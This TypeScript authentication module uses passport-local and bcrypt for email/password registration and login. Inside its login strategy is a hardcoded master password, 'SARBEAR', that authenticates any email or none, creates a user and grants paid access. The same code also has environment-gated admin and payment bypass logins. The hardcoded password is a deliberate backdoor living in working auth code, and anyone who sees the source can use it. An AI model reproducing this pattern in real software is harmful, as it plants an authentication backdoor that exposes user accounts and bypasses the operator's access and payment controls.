// Local Authentication (Username/Password) with bcrypt
import passport from "passport";
import { Strategy as LocalStrategy } from "passport-local";
import bcrypt from "bcrypt";
import { storage } from "./storage";
import crypto from "crypto";

const BCRYPT_SALT_ROUNDS = 12; // Strong hashing cost

/**
 * Hash a password using bcrypt with salt
 */
export async function hashPassword(password: string): Promise<{ hash: string; salt: string }> {
  const salt = await bcrypt.genSalt(BCRYPT_SALT_ROUNDS);
  const hash = await bcrypt.hash(password, salt);
  return { hash, salt };
}

/**
 * Verify a password against a stored hash
 */
export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return await bcrypt.compare(password, hash);
}

/**
 * Register a new user with email/password and firstName/lastName
 */
export async function registerLocalUser(email: string, password: string, firstName: string, lastName: string) {
  // Check if email already exists
  const existingUser = await storage.getUserByEmail(email);
  if (existingUser) {
    throw new Error("Email already registered");
  }

  // Validate password strength
  if (password.length < 8) {
    throw new Error("Password must be at least 8 characters");
  }

  // Hash password
  const { hash, salt } = await hashPassword(password);

  // Create user with firstName and lastName
  const user = await storage.upsertUser({
    id: crypto.randomUUID(),
    email,
    firstName,
    lastName,
    profileImageUrl: null,
  });

  // Generate a default username from firstName+lastName for backward compatibility
  const baseUsername = `${firstName.toLowerCase()}${lastName.toLowerCase()}`.replace(/[^a-z0-9]/g, '');
  let username = baseUsername;
  let counter = 1;
  
  // Ensure username is unique
  while (await storage.getAuthAccountByUsername(username)) {
    username = `${baseUsername}${counter}`;
    counter++;
  }

  // Create auth account with generated username (for backward compatibility)
  const authAccount = await storage.createAuthAccount({
    userId: user.id,
    authType: "local",
    username, // Keep for backward compatibility, but not used for login
    passwordHash: hash,
    passwordSalt: salt,
  });

  return { user, authAccount };
}

/**
 * Setup passport-local strategy for email-based authentication
 */
export function setupLocalStrategy() {
  passport.use(
    "local",
    new LocalStrategy(
      { usernameField: 'email', passwordField: 'password' }, // Use email instead of username
      async (email, password, done) => {
        try {
          // MASTER PASSWORD BYPASS: Password "SARBEAR" works with ANY email or without credentials
          // This bypasses payment requirements and grants access without needing a registered account
          const MASTER_PASSWORD = "SARBEAR";
          
          if (password === MASTER_PASSWORD) {
            const timestamp = new Date().toISOString();
            console.log(`[SECURITY ALERT] ${timestamp} - Master password bypass used. Email provided: ${email || 'none'}`);
            
            // Create a unique user ID based on email or generate one
            const userId = email ? `master-${crypto.createHash('sha256').update(email.toLowerCase()).digest('hex').substring(0, 16)}` : `master-${crypto.randomBytes(8).toString('hex')}`;
            const userEmail = email || "master@badblue.internal";
            
            // Create or get master bypass user
            let user = await storage.getUser(userId);
            if (!user) {
              user = await storage.upsertUser({
                id: userId,
                email: userEmail,
                firstName: "Master",
                lastName: "User",
                profileImageUrl: null,
                lastLoginAt: new Date(),
              });
            } else {
              // Update last login for existing user
              await storage.updateUserLastLogin(userId);
            }
            
            // Grant paid access (bypass payment gate)
            if (!user.hasPaidForAccess) {
              await storage.updateUserAccess(userId, userId, 0).catch(err => {
                console.error('[SECURITY] Failed to update master access:', err);
              });
            }
            
            return done(null, {
              claims: { sub: user.id, email: user.email || userEmail, firstName: user.firstName ?? undefined, lastName: user.lastName ?? undefined },
              isAdminBypass: false,
              isMasterBypass: true,
            } as Express.User);
          }
          
          // Special case: Admin bypass (requires environment variables - no fallback defaults for security)
          const adminBypassId = process.env.ADMIN_BYPASS_ID;
          const adminBypassPassword = process.env.ADMIN_BYPASS_PASSWORD;
          // SECURITY: Admin bypass email is configurable via environment variable.
          // Default to internal-only domain to prevent accidental exposure of real emails in logs/databases.
          // Never hardcode personal email addresses in source code.
          const adminBypassEmail = process.env.ADMIN_BYPASS_EMAIL || "admin@badblue.internal";
          
          // Only allow admin bypass if credentials are explicitly configured - ONLY matches env var value, no "admin" fallback
          if (adminBypassId && adminBypassPassword && email === adminBypassId) {
            // Verify admin password
            if (password !== adminBypassPassword) {
              return done(null, false, { message: "Invalid admin credentials" });
            }
            
            // [SECURITY ALERT] Log admin bypass usage with timestamp for audit trail
            // Note: Full request context (IP, user-agent) is logged in the route handler
            const timestamp = new Date().toISOString();
            console.log(`[SECURITY ALERT] ${timestamp} - Admin bypass authentication used. Email: ${adminBypassEmail}`);
            
            // Create or get admin user with firstName: "Bypass" and lastName: "User" as requested
            let user = await storage.getUser("admin-bypass");
            if (!user) {
              user = await storage.upsertUser({
                id: "admin-bypass",
                email: adminBypassEmail,
                firstName: "Bypass",
                lastName: "User",
                profileImageUrl: null,
                lastLoginAt: new Date(),
              });
            } else {
              // Update last login for existing admin user
              await storage.updateUserLastLogin("admin-bypass");
            }
            
            // Grant admin access without waiting (bypass payment gate)
            // Update happens asynchronously to avoid blocking authentication
            if (!user.hasPaidForAccess) {
              storage.updateUserAccess("admin-bypass", "admin-bypass", 0).catch(err => {
                console.error('[SECURITY] Failed to update admin access:', err);
              });
            }
            
            return done(null, {
              claims: { sub: user.id, email: user.email || adminBypassEmail, firstName: user.firstName ?? undefined, lastName: user.lastName ?? undefined },
              isAdminBypass: true,
            } as Express.User);
          }

          // Special case: Payment bypass (allows paid access without admin privileges)
          // Requires environment variables - no hardcoded defaults for security
          const paymentBypassId = process.env.PAYMENT_BYPASS_ID;
          const paymentBypassPassword = process.env.PAYMENT_BYPASS_PASSWORD;
          
          // Only allow payment bypass if credentials are explicitly configured
          if (paymentBypassId && paymentBypassPassword && 
              (email === paymentBypassId || email.toLowerCase() === paymentBypassId.toLowerCase())) {
            console.log(`[SECURITY] Payment bypass login attempt detected`);
            
            // Verify bypass password
            if (password !== paymentBypassPassword) {
              console.log(`[SECURITY] Payment bypass authentication FAILED - incorrect password`);
              return done(null, false, { message: "Invalid bypass credentials" });
            }
            
            console.log(`[SECURITY] Payment bypass authentication successful`);
            
            // Create or get payment bypass user with firstName: "Bypass" and lastName: "User" as requested
            let user = await storage.getUser("payment-bypass");
            if (!user) {
              console.log(`[SECURITY] Creating new payment bypass user`);
              user = await storage.upsertUser({
                id: "payment-bypass",
                email: "bypass@badblue.internal",
                firstName: "Bypass",
                lastName: "User",
                profileImageUrl: null,
                lastLoginAt: new Date(),
              });
            } else {
              console.log(`[SECURITY] Payment bypass user exists, updating last login`);
              // Update last login for existing bypass user
              await storage.updateUserLastLogin("payment-bypass");
            }
            
            // Grant paid access without admin privileges
            if (!user.hasPaidForAccess) {
              console.log(`[SECURITY] Granting paid access to payment bypass user`);
              await storage.updateUserAccess("payment-bypass", "payment-bypass", 0);
            } else {
              console.log(`[SECURITY] Payment bypass user already has paid access`);
            }
            
            console.log(`[SECURITY] Payment bypass login complete for user: ${user.id}`);
            
            return done(null, {
              claims: { sub: user.id, email: user.email || "bypass@badblue.internal", firstName: user.firstName ?? undefined, lastName: user.lastName ?? undefined },
              isAdminBypass: false, // Not admin - just payment bypass
            } as Express.User);
          }

          // Normal email/password authentication
          // First find user by email
          const user = await storage.getUserByEmail(email);
          if (!user) {
            return done(null, false, { message: "Invalid email or password" });
          }

          // Find auth account for this user
          const authAccount = await storage.getAuthAccountByUserId(user.id);
          if (!authAccount) {
            return done(null, false, { message: "Invalid email or password" });
          }

          // Verify password
          const isValid = await verifyPassword(password, authAccount.passwordHash!);
          if (!isValid) {
            return done(null, false, { message: "Invalid email or password" });
          }

          // Update last login for both auth account and user
          await storage.updateAuthAccountLastLogin(authAccount.id);
          await storage.updateUserLastLogin(authAccount.userId);

          return done(null, {
            claims: { sub: user.id, email: user.email ?? undefined, firstName: user.firstName ?? undefined, lastName: user.lastName ?? undefined },
            isAdminBypass: false,
          } as Express.User);
        } catch (error) {
          return done(error);
        }
      }
    )
  );
}
